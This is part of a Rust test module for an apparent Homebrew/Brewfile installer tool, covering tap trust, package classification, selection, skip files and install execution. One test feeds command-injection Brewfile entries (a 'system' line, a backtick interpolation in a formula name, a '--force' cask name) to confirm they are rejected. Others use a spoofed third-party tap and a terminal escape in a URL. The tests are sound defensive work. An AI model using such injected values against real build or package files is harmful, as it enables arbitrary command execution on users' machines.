        assert_eq!(load_wanted_file(&brewfile).unwrap().plan.casks, vec!["zed"]);
        let empty = dir.path().join("notes.txt");
        std::fs::write(&empty, "nothing here\n").unwrap();
        assert!(load_wanted_file(&empty).is_err());
    }

    #[test]
    fn a_tap_the_user_has_not_trusted_is_a_third_party_item_not_a_failure() {
        let stderr = "Error: Refusing to load asmvik/formulae/skhd from an untrusted tap.\n\
                      Run `brew trust --formula asmvik/formulae/skhd` or `brew trust asmvik/formulae` to trust it.";
        assert_eq!(
            untrusted_name_in(stderr).as_deref(),
            Some("asmvik/formulae/skhd")
        );
        assert_eq!(
            untrusted_name_in("Run `brew trust --cask someone/tap/app` to trust it.").as_deref(),
            Some("someone/tap/app")
        );
        assert_eq!(untrusted_name_in("Error: No available formula"), None);
    }

    const FORMULAE: &str = include_str!("../../tests/fixtures/brew_info_formulae.json");
    const CASKS: &str = include_str!("../../tests/fixtures/brew_info_casks.json");

    fn formula(name: &str) -> FormulaInfo {
        parse_brew_info(FORMULAE)
            .unwrap()
            .formulae
            .into_iter()
            .find(|f| f.full_name == name)
            .unwrap()
    }

    fn cask(token: &str) -> CaskInfo {
        parse_brew_info(CASKS)
            .unwrap()
            .casks
            .into_iter()
            .find(|c| c.token == token)
            .unwrap()
    }

    #[test]
    fn captured_brew_info_parses_into_the_few_fields_that_matter() {
        let info = parse_brew_info(FORMULAE).unwrap();
        assert_eq!(info.formulae.len(), 2);
        assert!(info.casks.is_empty());
        let jq = formula("jq");
        assert_eq!(jq.tap.as_deref(), Some("homebrew/core"));
        assert!(jq.desc.as_deref().unwrap().contains("JSON"));

        let casks = parse_brew_info(CASKS).unwrap().casks;
        assert_eq!(casks.len(), 3);
    }

    #[test]
    fn a_core_formula_carries_no_flags_and_is_checked_by_default() {
        let item = classify_formula("jq", &formula("jq"));
        assert!(item.flags.is_empty(), "{:?}", item.flags);
        assert!(item.default_selected());
        assert_eq!(
            item.install_args(),
            vec!["install", "--formula", "--", "jq"]
        );
    }

    #[test]
    fn a_formula_from_a_third_party_tap_is_flagged_and_unchecked() {
        let item = classify_formula(
            "olets/tap/git-prompt-kit",
            &formula("olets/tap/git-prompt-kit"),
        );
        assert!(item.has(Flag::ThirdPartyTap));
        assert_eq!(item.tap.as_deref(), Some("olets/tap"));
        assert!(!item.default_selected());
    }

    #[test]
    fn a_cask_with_a_pkg_needs_a_password_and_an_app_cask_does_not() {
        assert!(classify_cask("zoom", &cask("zoom")).has(Flag::NeedsPassword));
        assert!(!classify_cask("firefox", &cask("firefox")).has(Flag::NeedsPassword));
    }

    #[test]
    fn a_no_check_cask_is_flagged_as_an_unverified_download_but_stays_checked() {
        let chrome = classify_cask("google-chrome", &cask("google-chrome"));
        assert!(chrome.has(Flag::UnverifiedDownload));
        assert!(
            chrome.default_selected(),
            "unverified is a warning, not a refusal"
        );
        assert!(!classify_cask("firefox", &cask("firefox")).has(Flag::UnverifiedDownload));
    }

    #[test]
    fn deprecated_and_disabled_packages_start_unchecked() {
        let mut info = formula("jq");
        info.deprecated = true;
        assert!(!classify_formula("jq", &info).default_selected());
        info.deprecated = false;
        info.disabled = true;
        let item = classify_formula("jq", &info);
        assert!(item.has(Flag::Disabled));
        assert!(!item.default_selected());
    }

    #[test]
    fn brews_missing_name_message_is_understood_for_both_kinds() {
        assert_eq!(
            missing_name_in(
                "Error: No available formula with the name \"nope-a\". Did you mean node-sass?"
            )
            .as_deref(),
            Some("nope-a")
        );
        assert_eq!(
            missing_name_in("Error: Cask 'nope-a' is unavailable: No Cask with this name exists.")
                .as_deref(),
            Some("nope-a")
        );
        assert_eq!(missing_name_in("Error: something else"), None);
    }

    #[test]
    fn homepage_domains_drop_the_scheme_path_and_www() {
        assert_eq!(
            homepage_domain("https://www.mozilla.org/firefox/").as_deref(),
            Some("mozilla.org")
        );
        assert_eq!(
            homepage_domain("https://jqlang.github.io/jq/").as_deref(),
            Some("jqlang.github.io")
        );
        assert_eq!(homepage_domain("https://"), None);
    }

    /// A host that answers from fixtures and records every command.
    #[derive(Default)]
    struct FakeHost {
        calls: Vec<String>,
        missing: Vec<String>,
        installed_formulae: Vec<String>,
        fail_install: Vec<String>,
        mas: bool,
        mas_list: String,
        mas_root: bool,
        /// Answer `brew info` in reverse order, to prove pairing is by name.
        reverse: bool,
        /// The administrator approval lapsed and nobody can renew it.
        admin_lost: bool,
    }

    impl Host for FakeHost {
        fn ensure_admin(&mut self) -> bool {
            self.calls.push("ensure admin".into());
            !self.admin_lost
        }

        fn brew(&mut self, list: &[String]) -> Result<CmdOutput> {
            self.calls.push(format!("brew {}", list.join(" ")));
            let ok = |stdout: String| {
                Ok(CmdOutput {
                    success: true,
                    stdout,
                    stderr: String::new(),
                })
            };
            match list[0].as_str() {
                "tap" if list.len() == 1 => ok("homebrew/services\n".into()),
                "list" if list[1] == "--formula" => ok(self.installed_formulae.join("\n")),
                "list" => ok(String::new()),
                "info" => {
                    let names = &list[4..];
                    if let Some(m) = names.iter().find(|n| self.missing.contains(n)) {
                        return Ok(CmdOutput {
                            success: false,
                            stdout: String::new(),
                            stderr: format!("Error: No available formula with the name \"{m}\".\n"),
                        });
                    }
                    let source = if list[2] == "--formula" {
                        FORMULAE
                    } else {
                        CASKS
                    };
                    let all = serde_json::from_str::<serde_json::Value>(source).unwrap();
                    let key = if list[2] == "--formula" {
                        "formulae"
                    } else {
                        "casks"
                    };
                    let picked: Vec<serde_json::Value> = names
                        .iter()
                        .filter_map(|n| {
                            all[key].as_array().unwrap().iter().find(|e| {
                                e.get("full_name").or_else(|| e.get("full_token"))
                                    == Some(&serde_json::Value::String(n.clone()))
                            })
                        })
                        .cloned()
                        .collect();
                    let mut picked = picked;
                    if self.reverse {
                        picked.reverse();
                    }
                    ok(serde_json::json!({ key: picked }).to_string())
                }
                "install" if self.fail_install.contains(&list[3]) => Ok(CmdOutput {
                    success: false,
                    stdout: String::new(),
                    stderr: "==> Downloading\nError: download failed\n".into(),
                }),
                _ => ok(String::new()),
            }
        }

        fn mas(&mut self, list: &[String], as_root: bool) -> Result<CmdOutput> {
            let prefix = if as_root { "sudo mas" } else { "mas" };
            self.calls.push(format!("{prefix} {}", list.join(" ")));
            let stdout = match list[0].as_str() {
                "list" => self.mas_list.clone(),
                "help" if self.mas_root => "Requires root privileges to install apps".into(),
                _ => String::new(),
            };
            Ok(CmdOutput {
                success: list[0] != "account",
                stdout,
                stderr: if list[0] == "account" {
                    "Error: Unexpected argument 'account'".into()
                } else {
                    String::new()
                },
            })
        }

        fn has_mas(&mut self) -> bool {
            self.mas
        }
    }

    fn wanted(brewfile: &str) -> Wanted {
        wanted_from(Some(brewfile), None)
    }

    #[test]
    fn resolution_asks_brew_once_per_kind_when_everything_exists() {
        let mut host = FakeHost::default();
        let r = resolve(
            &wanted("brew \"jq\"\ncask \"firefox\"\ncask \"zoom\"\n"),
            &mut host,
        )
        .unwrap();
        let infos = host.calls.iter().filter(|c| c.contains(" info ")).count();
        assert_eq!(infos, 2, "{:?}", host.calls);
        assert_eq!(r.items.len(), 3);
        assert!(r.items.iter().all(|i| i.desc.is_some()));
    }

    #[test]
    fn an_unknown_name_is_dropped_and_the_rest_are_still_resolved() {
        let mut host = FakeHost {
            missing: vec!["renamed-tool".into()],
            ..FakeHost::default()
        };
        let r = resolve(&wanted("brew \"renamed-tool\"\nbrew \"jq\"\n"), &mut host).unwrap();
        let gone = r.items.iter().find(|i| i.name == "renamed-tool").unwrap();
        assert!(gone.has(Flag::NotFound));
        assert!(!gone.default_selected());
        let jq = r.items.iter().find(|i| i.name == "jq").unwrap();
        assert!(jq.desc.is_some());
    }

    #[test]
    fn an_untapped_third_party_tap_is_not_looked_up_because_that_would_tap_it() {
        let mut host = FakeHost::default();
        let r = resolve(&wanted("brew \"someone/tools/widget\"\n"), &mut host).unwrap();
        assert!(
            host.calls.iter().all(|c| !c.contains("someone/tools")),
            "{:?}",
            host.calls
        );
        assert!(r.items[0].has(Flag::ThirdPartyTap));
    }

    #[test]
    fn installed_items_are_listed_as_present_and_never_offered() {
        let mut host = FakeHost {
            installed_formulae: vec!["jq".into()],
            ..FakeHost::default()
        };
        let r = resolve(&wanted("brew \"jq\"\ncask \"firefox\"\n"), &mut host).unwrap();
        let t = triage(r.items, &Filters::default());
        assert_eq!(t.present.len(), 1);
        assert_eq!(t.present[0].name, "jq");
        assert!(t.offered.iter().all(|i| i.name != "jq"));
    }

    fn items() -> Vec<Item> {
        vec![
            classify_formula("jq", &formula("jq")),
            classify_formula(
                "olets/tap/git-prompt-kit",
                &formula("olets/tap/git-prompt-kit"),
            ),
            classify_cask("firefox", &cask("firefox")),
            classify_cask("zoom", &cask("zoom")),
            classify_not_found(Kind::Cask, "gone"),
            classify_app_store(497799835, Some("Xcode"), true),
        ]
    }

    fn names(items: &[Item]) -> Vec<String> {
        items.iter().map(|i| i.name.clone()).collect()
    }

    #[test]
    fn the_default_selection_leaves_out_third_party_and_not_found_items() {
        let t = triage(items(), &Filters::default());
        let chosen: Vec<String> = default_selection(&t.offered)
            .into_iter()
            .map(|n| t.offered[n].name.clone())
            .collect();
        assert_eq!(chosen, vec!["jq", "firefox", "zoom", "497799835"]);
    }

    #[test]
    fn only_selects_exactly_the_named_items_by_any_of_their_names() {
        let mut t = triage(
            items(),
            &Filters {
                only: vec![
                    "olets/tap/git-prompt-kit".into(),
                    "Xcode".into(),
                    "nonesuch".into(),
                ],
                ..Filters::default()
            },
        );
        assert_eq!(t.unknown_only, vec!["nonesuch".to_string()]);
        let all: Vec<usize> = (0..t.offered.len()).collect();
        let selected = choose(&mut t, &all);
        assert_eq!(
            names(&selected),
            vec!["olets/tap/git-prompt-kit", "497799835"]
        );
    }

    #[test]
    fn skip_wins_over_only_and_removes_the_item_from_the_offer() {
        let t = triage(
            items(),
            &Filters {
                only: vec!["jq".into(), "zoom".into()],
                skip: vec!["zoom".into()],
                ..Filters::default()
            },
        );
        assert_eq!(names(&t.offered), vec!["jq"]);
        assert!(t
            .skipped
            .iter()
            .any(|(i, r)| i.name == "zoom" && *r == SkipReason::Flag));
    }

    #[test]
    fn a_remembered_deselection_is_not_offered_unless_reselect_is_given() {
        let remembered: BTreeSet<String> = ["firefox".to_string()].into();
        let t = triage(
            items(),
            &Filters {
                remembered: remembered.clone(),
                ..Filters::default()
            },
        );
        assert!(!names(&t.offered).contains(&"firefox".to_string()));
        assert!(t
            .skipped
            .iter()
            .any(|(i, r)| i.name == "firefox" && *r == SkipReason::Remembered));

        let t = triage(
            items(),
            &Filters {
                remembered,
                reselect: true,
                ..Filters::default()
            },
        );
        assert!(names(&t.offered).contains(&"firefox".to_string()));
    }

    #[test]
    fn the_skip_file_remembers_unchecked_items_and_forgets_rechecked_ones() {
        let dir = tempfile::TempDir::new().unwrap();
        let path = dir.path().join(SKIP_FILE_NAME);
        assert_eq!(SkipFile::load(&path), (SkipFile::default(), None));

        let offered = triage(items(), &Filters::default()).offered;
        let mut file = SkipFile::default();
        file.skip.insert("jq".into());
        let jq = offered.iter().position(|i| i.name == "jq").unwrap();
        file.record(&offered, &[jq]);
        file.save(&path).unwrap();

        let (loaded, warning) = SkipFile::load(&path);
        assert_eq!(warning, None);
        assert!(!loaded.skip.contains("jq"), "re-checked, so forgotten");
        assert!(loaded.skip.contains("firefox"));
        assert!(loaded.skip.contains("497799835"));
        assert!(std::fs::read_to_string(&path)
            .unwrap()
            .contains("--reselect"));
    }

    #[test]
    fn a_checked_item_that_cannot_install_is_skipped_rather_than_attempted() {
        let mut t = triage(items(), &Filters::default());
        let all: Vec<usize> = (0..t.offered.len()).collect();
        let selected = choose(&mut t, &all);
        assert!(!names(&selected).contains(&"gone".to_string()));
        assert!(t
            .skipped
            .iter()
            .any(|(i, r)| i.name == "gone" && *r == SkipReason::Uninstallable));
    }

    #[test]
    fn app_store_titles_are_dropped_with_a_reason_when_signed_out() {
        let mut skipped = Vec::new();
        let kept = drop_app_store_if_signed_out(items(), AppStoreAccount::SignedOut, &mut skipped);
        assert!(kept.iter().all(|i| i.kind != Kind::AppStore));
        assert_eq!(skipped.len(), 1);
        assert_eq!(skipped[0].1, SkipReason::SignedOut);

        let mut skipped = Vec::new();
        let kept = drop_app_store_if_signed_out(items(), AppStoreAccount::Unknown, &mut skipped);
        assert_eq!(kept.len(), items().len(), "unknown is not signed out");
    }

    #[test]
    fn mas_7_without_an_account_command_reports_unknown_not_signed_out() {
        let mut host = FakeHost {
            mas: true,
            ..FakeHost::default()
        };
        assert_eq!(app_store_account(&mut host), AppStoreAccount::Unknown);
        let mut none = FakeHost::default();
        assert_eq!(app_store_account(&mut none), AppStoreAccount::Unknown);
    }

    #[test]
    fn app_store_titles_need_a_password_only_when_mas_requires_root() {
        let mut host = FakeHost {
            mas: true,
            mas_root: true,
            mas_list: "  937984704  Amphetamine  (5.3.2)\n".into(),
            ..FakeHost::default()
        };
        let w = wanted("mas \"Amphetamine\", id: 937984704\nmas \"Xcode\", id: 497799835\n");
        let r = resolve(&w, &mut host).unwrap();
        let xcode = r.items.iter().find(|i| i.name == "497799835").unwrap();
        assert!(xcode.has(Flag::NeedsPassword));
        assert_eq!(xcode.title.as_deref(), Some("Xcode"));
        assert!(!xcode.installed);
        assert!(
            r.items
                .iter()
                .find(|i| i.name == "937984704")
                .unwrap()
                .installed
        );
    }

    #[test]
    fn option_labels_show_name_description_domain_and_flags() {
        let zoom = option_label(&classify_cask("zoom", &cask("zoom")));
        assert!(zoom.starts_with("App "), "{zoom}");
        assert!(zoom.contains("zoom"));
        assert!(zoom.contains("Video communication"));
        assert!(zoom.contains("(zoom.us)"));
        assert!(zoom.contains("[needs password]"));

        let xcode = option_label(&classify_app_store(497799835, Some("Xcode"), false));
        assert!(xcode.contains("Xcode (497799835)"));
        assert!(
            !xcode.contains('['),
            "App Store is shown by the group: {xcode}"
        );
    }

    #[test]
    fn the_summary_counts_passwords_app_store_and_flags_and_names_new_taps() {
        let selected = vec![
            classify_formula("jq", &formula("jq")),
            classify_formula(
                "olets/tap/git-prompt-kit",
                &formula("olets/tap/git-prompt-kit"),
            ),
            classify_cask("zoom", &cask("zoom")),
            classify_cask("google-chrome", &cask("google-chrome")),
            classify_app_store(497799835, None, true),
        ];
        let s = summarize(&selected, &BTreeSet::new());
        assert_eq!(s.to_install, 5);
        assert_eq!(s.needs_password, 2);
        assert_eq!(s.app_store, 1);
        assert_eq!(s.taps, vec!["olets/tap".to_string()]);
        assert_eq!(s.flagged.len(), 2, "{:?}", s.flagged);

        let text = render_summary(&s, AppStoreAccount::Unknown);
        assert!(text.contains("5 to install"));
        assert!(text.contains("2 need an administrator password"));
        assert!(text.contains("sign-in could not be checked"));
        assert!(text.contains("Will tap olets/tap"));

        let tapped: BTreeSet<String> = ["olets/tap".to_string()].into();
        assert!(summarize(&selected, &tapped).taps.is_empty());
    }

    #[test]
    fn the_dry_run_plan_groups_items_and_explains_what_is_left_out() {
        let mut t = triage(items(), &Filters::default());
        let defaults = default_selection(&t.offered);
        let selected = choose(&mut t, &defaults);
        let resolution = Resolution {
            items: vec![],
            tapped: BTreeSet::new(),
            account: AppStoreAccount::SignedIn,
            rejected: vec!["bad#{x}".into()],
        };
        let plan = render_plan(&selected, &t, &resolution);
        assert!(plan.contains("CLI tools (1)"), "{plan}");
        assert!(plan.contains("Apps (2)"), "{plan}");
        assert!(plan.contains("App Store (1)"), "{plan}");
        assert!(
            plan.contains("git-prompt-kit (not selected) [third-party tap]"),
            "{plan}"
        );
        assert!(plan.contains("Ignored 1 inventory entry"), "{plan}");
        assert!(
            !plan.contains("bad#{x}"),
            "an unsafe name is counted, not echoed"
        );
    }

    #[test]
    fn execution_taps_only_what_selected_items_need_and_reports_failures_with_retries() {
        let mut host = FakeHost {
            mas: true,
            fail_install: vec!["zoom".into()],
            ..FakeHost::default()
        };
        let selected = vec![
            classify_app_store(497799835, Some("Xcode"), true),
            classify_cask("zoom", &cask("zoom")),
            classify_formula(
                "olets/tap/git-prompt-kit",
                &formula("olets/tap/git-prompt-kit"),
            ),
            classify_formula("jq", &formula("jq")),
        ];
        let mut steps = Vec::new();
        let report = execute(&selected, &BTreeSet::new(), &mut host, &mut |s| {
            steps.push(s.to_string())
        });

        assert_eq!(
            host.calls,
            vec![
                "brew tap -- olets/tap",
                "brew install --formula -- olets/tap/git-prompt-kit",
                "brew install --formula -- jq",
                // The approval is confirmed before each item that needs it.
                "ensure admin",
                "brew install --cask -- zoom",
                "ensure admin",
                "sudo mas install 497799835",
            ]
        );
        assert_eq!(steps.len(), 5);
        assert_eq!(report.installed.len(), 3);
        assert_eq!(report.failed.len(), 1);
        let (item, reason, retry) = &report.failed[0];
        assert_eq!(item.name, "zoom");
        assert_eq!(reason, "Error: download failed");
        assert_eq!(retry, "brew install --cask -- zoom");

        let text = report.render();
        assert!(text.contains("Installed: 3"));
        assert!(text.contains("retry: brew install --cask -- zoom"));
        assert!(!report.ok());
    }

    #[test]
    fn a_progress_meter_is_not_kept_but_the_lines_after_it_are() {
        let mut cmd = std::process::Command::new("sh");
        cmd.args(["-c", "printf '10%%\\r50%%\\r100%%\\rInstalled Xcode\\n'"]);
        let out = capture(cmd).unwrap();
        assert_eq!(out.stdout, "Installed Xcode\n");
    }

    #[test]
    fn a_background_process_holding_the_output_open_does_not_hang_the_run() {
        // An install that leaves a helper running, which inherits brew's
        // stdout: the command is done, but the pipe stays open.
        for live in [true, false] {
            let mut cmd = std::process::Command::new("sh");
            cmd.args(["-c", "sleep 20 & echo installed; exit 0"]);
            let started = std::time::Instant::now();
            let out = if live { stream(cmd) } else { capture(cmd) }.unwrap();
            assert!(out.success);
            assert_eq!(out.stdout, "installed\n");
            assert!(
                started.elapsed() < std::time::Duration::from_secs(8),
                "waited {:?} for a pipe a background process held open",
                started.elapsed()
            );
        }
    }

    #[test]
    fn streamed_output_is_kept_for_the_report_and_the_exit_status_survives() {
        let mut cmd = std::process::Command::new("sh");
        cmd.args([
            "-c",
            "echo '==> Downloading'; echo 'Error: it broke' >&2; exit 3",
        ]);
        let out = stream(cmd).unwrap();
        assert!(!out.success);
        assert_eq!(out.stdout, "==> Downloading\n");
        assert_eq!(out.reason(), "Error: it broke");
    }

    #[test]
    fn a_lapsed_password_skips_the_items_that_need_it_instead_of_waiting() {
        let mut host = FakeHost {
            admin_lost: true,
            ..FakeHost::default()
        };
        let w = wanted("brew \"jq\"\ncask \"zoom\"\n");
        let r = resolve(&w, &mut host).unwrap();
        let mut t = triage(r.items, &Filters::default());
        let all: Vec<usize> = (0..t.offered.len()).collect();
        let selected = choose(&mut t, &all);
        let report = execute(&selected, &r.tapped, &mut host, &mut |_| {});

        assert!(report.installed.iter().any(|i| i.name == "jq"));
        assert!(report
            .skipped
            .iter()
            .any(|(i, why)| i.name == "zoom" && *why == SkipReason::NoTerminalForPassword));
        assert!(!host
            .calls
            .iter()
            .any(|c| c.contains("install --cask -- zoom")));
        // Checked only for the item that needs it.
        assert_eq!(
            host.calls.iter().filter(|c| *c == "ensure admin").count(),
            1
        );
    }

    #[test]
    fn brew_is_never_run_under_sudo_and_never_given_a_brewfile() {
        let mut host = FakeHost {
            mas: true,
            mas_root: true,
            ..FakeHost::default()
        };
        let w = wanted(concat!(
            "system \"touch /tmp/pwned\"\n",
            "brew \"git#{`touch /tmp/pwned`}\"\n",
            "cask \"--force\"\n",
            "brew \"jq\"\n",
            "cask \"zoom\"\n",
            "mas \"Xcode\", id: 497799835\n",
        ));
        assert_eq!(w.plan.rejected.len(), 2);
        let r = resolve(&w, &mut host).unwrap();
        let mut t = triage(r.items, &Filters::default());
        let all: Vec<usize> = (0..t.offered.len()).collect();
        let selected = choose(&mut t, &all);
        execute(&selected, &r.tapped, &mut host, &mut |_| {});

        for call in &host.calls {
            assert!(!call.starts_with("sudo brew"), "{call}");
            assert!(!call.contains("bundle"), "{call}");
            assert!(!call.contains("pwned"), "{call}");
            assert!(!call.contains("--force"), "{call}");
        }
        assert!(host
            .calls
            .contains(&"brew install --formula -- jq".to_string()));
    }

    #[test]
    fn items_under_a_failed_tap_are_skipped_not_attempted() {
        struct TapFails(Vec<String>);
        impl Host for TapFails {
            fn brew(&mut self, list: &[String]) -> Result<CmdOutput> {
                self.0.push(list.join(" "));
                Ok(CmdOutput {
                    success: list[0] != "tap",
                    stdout: String::new(),
                    stderr: "Error: tap failed".into(),
                })
            }
            fn mas(&mut self, _: &[String], _: bool) -> Result<CmdOutput> {
                unreachable!()
            }
            fn has_mas(&mut self) -> bool {
                false
            }
        }
        let mut host = TapFails(Vec::new());
        let selected = vec![classify_untapped(Kind::Formula, "someone/tools/widget")];
        let report = execute(&selected, &BTreeSet::new(), &mut host, &mut |_| {});
        assert_eq!(host.0, vec!["tap -- someone/tools"]);
        assert_eq!(report.taps_failed.len(), 1);
        assert!(matches!(report.skipped[0].1, SkipReason::Dependency(_)));
        assert!(report.render().contains("retry: brew tap someone/tools"));
    }

    #[test]
    fn answers_are_paired_with_names_even_when_brew_reorders_them() {
        let mut host = FakeHost {
            reverse: true,
            ..FakeHost::default()
        };
        let r = resolve(&wanted("cask \"firefox\"\ncask \"zoom\"\n"), &mut host).unwrap();
        let firefox = r.items.iter().find(|i| i.name == "firefox").unwrap();
        assert_eq!(
            firefox.homepage.as_deref(),
            Some("https://www.mozilla.org/firefox/")
        );
        let zoom = r.items.iter().find(|i| i.name == "zoom").unwrap();
        assert!(zoom.has(Flag::NeedsPassword));
    }

    #[test]
    fn an_alias_or_old_name_is_paired_with_the_formula_brew_answered_with() {
        // brew deduplicates: `python` and `python3` come back as one entry.
        let info: FormulaInfo = serde_json::from_str(
            r#"{"name":"python@3.14","full_name":"python@3.14","tap":"homebrew/core",
                "aliases":["python","python3"],"oldnames":["python@3.14-old"]}"#,
        )
        .unwrap();
        for query in [
            "python",
            "python3",
            "python@3.14",
            "homebrew/core/python@3.14",
            "python@3.14-old",
        ] {
            assert!(info.answers(query), "{query}");
        }
        assert!(!info.answers("python@3.13"));
        assert!(!info.answers("evil/tap/python"));
    }

    #[test]
    fn a_bare_name_never_selects_an_item_from_a_third_party_tap() {
        let mut evil = classify_formula("jq", &formula("jq"));
        evil.name = "evil/tap/jq".into();
        evil.token = "evil/tap/jq".into();
        evil.tap = Some("evil/tap".into());
        evil.flags.insert(Flag::ThirdPartyTap);

        assert!(!evil.selected_by("jq"));
        assert!(!evil.selected_by("JQ"));
        assert!(evil.selected_by("evil/tap/jq"));
        assert!(evil.matches("jq"), "--skip may still match loosely");

        let t = triage(
            vec![evil.clone()],
            &Filters {
                only: vec!["jq".into()],
                ..Filters::default()
            },
        );
        assert!(t.offered.is_empty());
        assert_eq!(
            t.needs_full_name,
            vec![("jq".to_string(), "evil/tap/jq".to_string())]
        );
        let mut s = String::new();
        render_left_out(&mut s, &t, &[]);
        assert!(s.contains("name it in full"), "{s}");

        let t = triage(
            vec![evil.clone()],
            &Filters {
                only: vec!["evil/tap/jq".into()],
                ..Filters::default()
            },
        );
        assert_eq!(names(&t.offered), vec!["evil/tap/jq"]);

        // --all uses the default selection, which never includes it.
        let t = triage(vec![evil], &Filters::default());
        assert!(default_selection(&t.offered).is_empty());
    }

    #[test]
    fn a_formula_installed_from_another_tap_does_not_count_as_installed() {
        let installed: BTreeSet<String> = ["x/y/jq".to_string(), "firefox".to_string()].into();
        assert!(!is_installed(
            &classify_formula("jq", &formula("jq")),
            &installed
        ));
        assert!(is_installed(
            &classify_cask("firefox", &cask("firefox")),
            &installed
        ));

        let mut core_qualified = classify_formula("jq", &formula("jq"));
        core_qualified.name = "homebrew/core/jq".into();
        let core: BTreeSet<String> = ["jq".to_string()].into();
        assert!(is_installed(&core_qualified, &core));
    }

    #[test]
    fn only_an_active_uncheck_is_remembered_not_an_item_that_started_unchecked() {
        let offered = triage(items(), &Filters::default()).offered;
        let mut file = SkipFile::default();
        file.record(&offered, &[]);
        assert!(file.skip.contains("jq"));
        assert!(file.skip.contains("zoom"));
        assert!(
            !file.skip.contains("olets/tap/git-prompt-kit"),
            "unchecked by default, so never decided on"
        );
        assert!(!file.skip.contains("gone"));
    }

    #[test]
    fn a_corrupt_skip_file_warns_and_reads_as_empty_and_saving_replaces_it_whole() {
        let dir = tempfile::TempDir::new().unwrap();
        let path = dir.path().join(SKIP_FILE_NAME);
        std::fs::write(&path, "skip = [\"unterminated\n").unwrap();
        let (file, warning) = SkipFile::load(&path);
        assert_eq!(file, SkipFile::default());
        assert!(warning.unwrap().contains("could not be parsed"));

        let mut file = file;
        file.skip.insert("zoom".into());
        file.save(&path).unwrap();
        assert_eq!(SkipFile::load(&path).0, file);
        let leftovers: Vec<_> = std::fs::read_dir(dir.path())
            .unwrap()
            .map(|e| e.unwrap().file_name())
            .collect();
        assert_eq!(
            leftovers.len(),
            1,
            "no temporary file left behind: {leftovers:?}"
        );
    }

    #[test]
    fn control_characters_in_a_homepage_never_reach_the_picker() {
        let mut item = classify_formula("jq", &formula("jq"));
        item.homepage = Some("https://ev\u{1b}[2Jil.example/".into());
        assert!(!option_label(&item).contains('\u{1b}'));
    }
}
